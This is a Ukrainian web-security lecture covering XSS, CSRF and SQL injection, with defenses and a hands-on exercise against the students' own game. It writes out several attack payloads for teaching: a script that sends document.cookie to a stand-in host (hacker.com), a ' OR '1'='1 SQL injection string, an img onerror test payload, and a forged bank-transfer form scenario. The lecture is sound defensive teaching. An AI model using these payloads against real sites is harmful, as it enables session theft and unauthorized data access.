# Лекція 8: Темна сторона Вебу. XSS, CSRF та SQL Injection

## Експрес-опитування: Чи зламають вас?

1.  Ви дозволили користувачу вводити своє ім'я, і він ввів `<b>Бог</b>`. Тепер його ім'я на сайті жирне. Це проблема?
2.  Ви зберігаєте паролі користувачів у базі даних. Що станеться, якщо хакер вкраде базу?
3.  Ви залогінені в банку. Ви клікнули на посилання в дивному листі. Чи можуть з вашого рахунку зникнути гроші?

<details markdown="1">
<summary>Відповіді (Страшна правда)</summary>

1.  **Так, це XSS.** Якщо він зможе зробити текст жирним, він зможе вставити `<script>` і вкрасти cookies всіх, хто зайде на його профіль.
2.  **Залежить від хешування.** Якщо паролі відкритим текстом — кінець. Якщо хешовані (SHA/Argon2) — у хакера буде лише набір символів .
3.  **Так, це CSRF.** Браузер автоматично відправляє ваші cookies банку, навіть якщо запит іде з сайту зловмисника .

</details>

---

## 1. XSS (Cross-Site Scripting)

Це коли зловмисник впроваджує свій JavaScript на вашу сторінку .

**Сценарій атаки:**
1.  Хакер пише в коментарі: `<script>fetch('http://hacker.com?cookie=' + document.cookie)</script>`.
2.  Сервер зберігає це.
3.  Ви заходите почитати коментарі.
4.  Ваш браузер виконує скрипт.
5.  Ваша сесія летить хакеру.

**Захист:**
* **Sanitization:** Очищення вхідних даних (видалення тегів `<script>`, `onload` тощо) .
* **Content Security Policy (CSP):** Заборона завантажувати скрипти з лівих доменів.
* **Escaping:** Перетворення `<` на `&lt;`. Сучасні фреймворки (React, Vue) роблять це автоматично.

---

## 2. CSRF (Cross-Site Request Forgery)

Атака "підробленого запиту" .

**Сценарій:**
1.  Ви залогінені на сайті `bank.com`.
2.  Хакер створює сайт `free-iphone.com`.
3.  На цьому сайті є прихована форма, яка відправляє POST запит на `bank.com/transfer?to=hacker&amount=1000`.
4.  Коли ви заходите на сайт хакера, форма відправляється.
5.  Браузер додає ваші куки від `bank.com`. Банк думає, що це ви зробили переказ.

**Захист:**
* **CSRF Tokens:** Секретний код у кожній формі, який знає тільки ваш сервер і ваш реальний фронтенд. Сайт хакера цей код не знає.

---

## 3. SQL Injection

Це класика бекенду . Введення SQL-коду замість даних.

**Код сервера:**
`SELECT * FROM users WHERE name = '` + **userName** + `';`

**Введення хакера:**
`' OR '1'='1`

**Результат запиту:**
`SELECT * FROM users WHERE name = '' OR '1'='1';`
Це поверне **ВСІХ** користувачів, бо `1=1` завжди істина.

**Захист:**
* Ніколи не склеювати рядки для запитів.
* Використовувати **Prepared Statements** (параметризовані запити).

---

## Практикум: "Етичний Хакінг"

Ми спробуємо зламати нашу власну гру "Камінь-Ножиці-Папір".

1.  Запустіть версію гри без захисту (з Воркшопу 5 або 6).
2.  Введіть як ім'я гравця: `<img src=x onerror=alert('PWNED')>`.
3.  Якщо ви побачили `alert`, вітаю — у вас XSS вразливість.
4.  **Виправлення:** Замість `innerHTML` використовуйте `innerText` або `textContent` при виводі імені. Це автоматично екранує теги.

## Домашнє завдання

Виконайте **Workshop 6 (Auth & Security)**. Реалізуйте хешування паролів, щоб захиститися від витоку локальної бази даних.